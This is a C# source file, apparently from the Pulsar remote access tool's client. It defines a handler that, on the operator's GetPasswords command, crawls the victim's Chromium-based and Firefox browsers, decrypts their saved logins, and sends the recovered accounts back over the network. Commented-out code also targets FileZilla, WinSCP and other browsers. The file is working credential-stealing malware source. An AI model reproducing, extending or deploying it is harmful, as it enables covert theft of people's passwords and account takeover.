using Pulsar.Client.Kematian.Browsers.Helpers;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using Pulsar.Client.Recovery;
using Pulsar.Client.Recovery.Browsers;
using Pulsar.Client.Recovery.Crawler;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Passwords;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;

//public struct BrowserChromium
//{
//    public string Name;
//    public string Path;
//    public string LocalState;
//    public ProfileChromium[] Profiles;
//}

//public struct ProfileChromium
//{
//    public string Name;
//    public string LoginData;
//    public string Path;
//}

//public struct BrowserGecko
//{
//    public string Name;
//    public string Path;
//    public string Key4;
//    public string Logins;
//}

namespace Pulsar.Client.Messages
{
    public class PasswordRecoveryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPasswords;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswords msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPasswords message)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            //var passReaders = new IAccountReader[]
            //{
            //    new BravePassReader(),
            //    new ChromePassReader(),
            //    new OperaPassReader(),
            //    new OperaGXPassReader(),
            //    new EdgePassReader(),
            //    new YandexPassReader(), 
            //    new FirefoxPassReader(), 
            //    new InternetExplorerPassReader(), 
            //    new FileZillaPassReader(), 
            //    new WinScpPassReader()
            //};

            //foreach (var passReader in passReaders)
            //{
            //    try
            //    {
            //        recovered.AddRange(passReader.ReadAccounts());
            //    }
            //    catch (Exception e)
            //    {
            //        Debug.WriteLine(e);
            //    }
            //}

            List<Recovery.Browsers.AllBrowsers> browsers = Crawl.Start();

            foreach (var browser in browsers)
            {
                foreach (var chromium in browser.Chromium)
                {
                    foreach (var profile in chromium.Profiles)
                    {
                        try
                        {
                            recovered.AddRange(ChromiumBase.ReadAccounts(profile.LoginData, chromium.LocalState, chromium.Name));
                        }
                        catch (Exception e)
                        {
                            Debug.WriteLine(e);
                        }
                    }
                }

                foreach (var gecko in browser.Gecko)
                {
                    try
                    {
                        recovered.AddRange(FirefoxPassReader.ReadAccounts(gecko.ProfilesDir, gecko.Name));
                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                    }
                    //Debug.WriteLine(gecko.Path);
                }
            }

            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
        }
    }
}